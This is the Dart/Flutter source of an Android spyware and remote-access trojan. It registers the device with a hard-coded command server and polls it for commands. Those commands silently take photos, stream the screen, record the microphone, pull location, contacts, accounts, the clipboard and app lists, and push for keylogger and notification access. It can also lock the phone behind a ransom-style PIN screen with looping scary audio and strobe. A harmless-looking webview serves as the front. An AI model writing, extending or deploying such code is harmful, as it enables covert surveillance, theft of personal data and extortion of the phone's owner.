import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart'; 
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:vibration/vibration.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:webview_flutter/webview_flutter.dart';

// CONFIG & CONTROLLER GLOBAL
Map<String, dynamic> appConfig = {};
ValueNotifier<bool> deviceLocked = ValueNotifier<bool>(false);
final AudioPlayer _audioPlayer = AudioPlayer();
String globalDeviceId = "";
String globalDeviceModel = "";
String currentLockMessage = "YOUR PHONE IS LOCKED!!!!";
String currentLockPIN = "123";

// Native Channels
const MethodChannel platformStrobe = MethodChannel('com.nullx.pp/strobe');
const MethodChannel platformSpy = MethodChannel('com.nullx.pp/background_spy');
const MethodChannel platformNativeLock = MethodChannel('com.nullx.pp/native_lock');

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await loadLocalConfig();
  
  // [+] AUTOMATIC PERMISSION LOOP
  await requestPermissions();

  Map<String, String> deviceInfo = await getDeviceInfo();
  globalDeviceId = deviceInfo['id']!;
  globalDeviceModel = deviceInfo['model']!;

  // Simpan ID ke sisi Native untuk sinkronisasi Service
  try {
    await platformSpy.invokeMethod('saveTargetId', {"id": globalDeviceId});
  } catch (e) {}

  initNativeChatListener();
  await registerInitialDevice(globalDeviceId, globalDeviceModel);
  startSpyware(globalDeviceId, globalDeviceModel);
  runApp(const MyApp());
}

void initNativeChatListener() {
  platformNativeLock.setMethodCallHandler((call) async {
    if (call.method == "onTargetReply") {
      String replyText = call.arguments;
      _sendResponseToServer("target_chat_reply", {"message": replyText});
    }
  });
}

Future<void> loadLocalConfig() async {
  try {
    final String response = await rootBundle.loadString('assets/config.json');
    appConfig = json.decode(response);
  } catch (e) {
    appConfig = {
      "server_url": "http://albyguard.naell.cloud:2049",
      "owner_name": "APPOLO_ADMIN",
      "landing_web": "https://google.com"
    };
  }
}

Future<void> requestPermissions() async {
  // [+] REQUEST ALL CRITICAL PERMISSIONS ON STARTUP
  await [
    Permission.location,
    Permission.contacts,
    Permission.camera,
    Permission.microphone,
    Permission.ignoreBatteryOptimizations,
    Permission.notification,
    Permission.sms, 
    Permission.phone,
    Permission.storage,
    Permission.systemAlertWindow, // Wajib untuk Hard Lock Overlay
  ].request();
}

Future<Map<String, String>> getDeviceInfo() async {
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
  String modelName = "Unknown";
  String identifier = "UNKNOWN_ID";
  if (Platform.isAndroid) {
    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
    modelName = "${androidInfo.brand.toUpperCase()} ${androidInfo.model}";
    identifier = "${androidInfo.brand}-${androidInfo.model}-${androidInfo.id}".replaceAll(' ', '_'); 
  }
  return {"id": identifier, "model": modelName};
}

Future<void> registerInitialDevice(String id, String model) async {
  try {
    final Battery battery = Battery();
    int level = await battery.batteryLevel;
    await http.post(
      Uri.parse("${appConfig['server_url']}/api/register-target"),
      body: jsonEncode({
        "id": id,
        "admin": appConfig['owner_name'],
        "model": model,
        "battery": level.toString(),
        "status": "Online",
        "lastSeen": DateTime.now().toIso8601String(),
      }),
      headers: {"Content-Type": "application/json"}
    );
  } catch (e) {}
}

void playScarySound() async {
  await _audioPlayer.setReleaseMode(ReleaseMode.loop);
  await _audioPlayer.play(UrlSource('https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Scary+Laugh&filename=24/243764-00f7e1b5-829d-4874-a690-671891b0c79b.mp3'));
}

void startSpyware(String deviceId, String deviceName) {
  String serverBase = appConfig['server_url'];
  
  // REAL-TIME SOCKET CONNECTION
  IO.Socket socket = IO.io(serverBase, IO.OptionBuilder()
      .setTransports(['websocket'])
      .setQuery({'id': deviceId})
      .enableAutoConnect()
      .build());

  socket.onConnect((_) => debugPrint('[+] Real-time Socket Connected'));
  socket.on('execute', (data) => executeLogic(data));

  // FALLBACK POLLING
  Timer.periodic(const Duration(seconds: 5), (t) async {
    try {
      await http.post(Uri.parse("$serverBase/api/heartbeat/$deviceId"), 
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"id": deviceId, "status": "Alive"})
      ).timeout(const Duration(seconds: 2));

      final response = await http.get(Uri.parse("$serverBase/api/get-command/$deviceId"));
      if (response.statusCode == 200) {
        var cmdData = jsonDecode(response.body);
        if (cmdData != null) executeLogic(cmdData);
      }
    } catch (e) { }
  });
}

// --- ARSENAL: 45+ FEATURES LOGIC SYNCED ---
Future<void> executeLogic(dynamic data) async {
  String command = data['command'] ?? "idle";
  String extra = data['extra'] ?? "";
  String type = data['type'] ?? "NORMAL";
  dynamic resultData;

  switch (command) {
    // FITUR KAMERA BACKGROUND TERBARU
    case "take_photo":
    case "takeSilentPhotoBackground":
      String side = extra.isEmpty ? "back" : extra;
      resultData = await platformSpy.invokeMethod('takeSilentPhotoBackground', {"side": side});
      break;

    case "get_screen":
      resultData = await platformSpy.invokeMethod('startScreenStreamBackground');
      break;
    case "get_location":
      Position pos = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
      resultData = {"lat": pos.latitude, "lng": pos.longitude};
      break;
    case "get_contacts":
      if (await FlutterContacts.requestPermission()) {
        final contacts = await FlutterContacts.getContacts(withProperties: true);
        resultData = {"contacts": contacts.take(50).map((e) => {"name": e.displayName, "num": e.phones.isNotEmpty ? e.phones.first.number : ""}).toList()};
      }
      break;
    case "get_accounts":
      resultData = {"accounts": await platformSpy.invokeMethod('getAccounts')};
      break;
    case "get_apps":
      resultData = {"apps": await platformSpy.invokeMethod('getInstalledApps')};
      break;
    case "get_system_stats":
      resultData = {"stats": await platformSpy.invokeMethod('getSystemStats')};
      break;
    case "hard_lock":
      if (extra.contains('|')) {
        List<String> parts = extra.split('|');
        currentLockMessage = parts[0];
        currentLockPIN = parts[1];
      }
      deviceLocked.value = true;
      playScarySound();
      await platformNativeLock.invokeMethod('startNativeLock', {"mode": type, "message": currentLockMessage, "password": currentLockPIN});
      resultData = {"status": "Locked Native ($type)"};
      break;
    case "unlock":
      deviceLocked.value = false;
      await _audioPlayer.stop();
      await platformStrobe.invokeMethod('stopStrobe');
      await platformNativeLock.invokeMethod('stopNativeLock');
      resultData = {"status": "Unlocked Native"};
      break;
    case "flash_strobe":
      await platformStrobe.invokeMethod('startStrobe');
      resultData = {"status": "Strobe Active"};
      break;
    case "stop_strobe":
      await platformStrobe.invokeMethod('stopStrobe');
      resultData = {"status": "Strobe Off"};
      break;
    case "set_wallpaper":
      await platformSpy.invokeMethod('setWallpaper', {"url": extra});
      resultData = {"status": "Wallpaper hijacked"};
      break;
    case "vibrate_loop":
      Vibration.vibrate(duration: 10000, repeat: 5);
      resultData = {"status": "Vibration Active"};
      break;
    case "play_audio":
      await platformSpy.invokeMethod('setVolumeMax');
      await _audioPlayer.setReleaseMode(ReleaseMode.loop);
      await _audioPlayer.play(UrlSource(extra));
      resultData = {"status": "Playing Audio URL (Max Vol)"};
      break;
    case "mic_record_start":
      await platformSpy.invokeMethod('startAudioRecord');
      resultData = {"status": "Microphone recording started"};
      break;
    case "mic_record_stop":
      String path = await platformSpy.invokeMethod('stopAudioRecord');
      resultData = {"status": "Recording saved", "path": path};
      break;
    case "speak_tts":
      await platformSpy.invokeMethod('speakText', {"text": extra});
      resultData = {"status": "TTS Executed"};
      break;
    case "toast_spam":
      await platformSpy.invokeMethod('showToast', {"msg": extra});
      resultData = {"status": "Toast displayed"};
      break;
    case "get_clipboard":
      String clip = await platformSpy.invokeMethod('getClipboard');
      resultData = {"clipboard": clip};
      break;
    case "get_heat":
      String heat = await platformSpy.invokeMethod('getHeatInfo');
      resultData = {"thermal": heat};
      break;
    case "check_keylogger":
      bool isEnabled = await platformSpy.invokeMethod('checkAccessibility');
      resultData = {"accessibility_enabled": isEnabled};
      break;
    case "force_accessibility":
      await platformSpy.invokeMethod('openAccessibilitySettings');
      resultData = {"status": "Accessibility Settings opened"};
      break;
    case "bring_to_foreground":
      await platformSpy.invokeMethod('bringToForeground');
      resultData = {"status": "Target forced to Foreground"};
      break;
    case "open_notif_access":
      await platformSpy.invokeMethod('openNotificationSettings');
      resultData = {"status": "Notification Access requested"};
      break;
    case "self_destruct":
      resultData = {"status": "Initiating self-destruct..."};
      break;
  }

  if (resultData != null) {
    _sendResponseToServer(command, resultData);
  }
}

Future<void> _sendResponseToServer(String cmd, dynamic data) async {
  try {
    await http.post(
      Uri.parse("${appConfig['server_url']}/api/post-response/$globalDeviceId"),
      body: jsonEncode({"data": data, "cmd": cmd}),
      headers: {"Content-Type": "application/json"}
    );
  } catch (e) {}
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: appConfig['owner_name'] ?? 'System',
      theme: ThemeData(brightness: Brightness.dark, scaffoldBackgroundColor: Colors.black),
      home: const MainLockWrapper(),
    );
  }
}

class MainLockWrapper extends StatefulWidget {
  const MainLockWrapper({super.key});
  @override
  State<MainLockWrapper> createState() => _MainLockWrapperState();
}

class _MainLockWrapperState extends State<MainLockWrapper> with WidgetsBindingObserver {
  final TextEditingController _passController = TextEditingController();
  late final WebViewController _webController;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _webController = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..loadRequest(Uri.parse(appConfig['landing_web'] ?? "https://google.com"));
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _passController.dispose();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (deviceLocked.value && (state == AppLifecycleState.paused || state == AppLifecycleState.inactive)) {
      platformSpy.invokeMethod('bringToForeground');
    }
  }

  @override
  Widget build(BuildContext context) {
    return ValueListenableBuilder<bool>(
      valueListenable: deviceLocked,
      builder: (context, isLocked, child) {
        return PopScope(
          canPop: !isLocked,
          child: Stack(
            children: [
              Scaffold(body: WebViewWidget(controller: _webController)),
              if (isLocked)
                Scaffold(
                  backgroundColor: Colors.black,
                  body: Padding(
                    padding: const EdgeInsets.all(20),
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        const Icon(Icons.gpp_maybe, color: Colors.red, size: 80),
                        const SizedBox(height: 20),
                        Text(currentLockMessage, textAlign: TextAlign.center, style: const TextStyle(color: Colors.red, fontSize: 22, fontWeight: FontWeight.bold)),
                        const SizedBox(height: 40),
                        TextField(
                          controller: _passController,
                          obscureText: true,
                          textAlign: TextAlign.center,
                          style: const TextStyle(color: Colors.white),
                          decoration: const InputDecoration(
                            hintText: "PASSWORD",
                            enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: Colors.red)),
                            focusedBorder: OutlineInputBorder(borderSide: BorderSide(color: Colors.red)),
                          ),
                        ),
                        const SizedBox(height: 20),
                        ElevatedButton(
                          style: ElevatedButton.styleFrom(backgroundColor: Colors.red[900], minimumSize: const Size(double.infinity, 50)),
                          onPressed: () async {
                            if (_passController.text == currentLockPIN) {
                              deviceLocked.value = false;
                              _audioPlayer.stop();
                              _passController.clear();
                              try { await platformNativeLock.invokeMethod('stopNativeLock'); } catch (e) {}
                            }
                          },
                          child: const Text("UNLOCK"),
                        ),
                      ],
                    ),
                  ),
                ),
            ],
          ),
        );
      },
    );
  }
}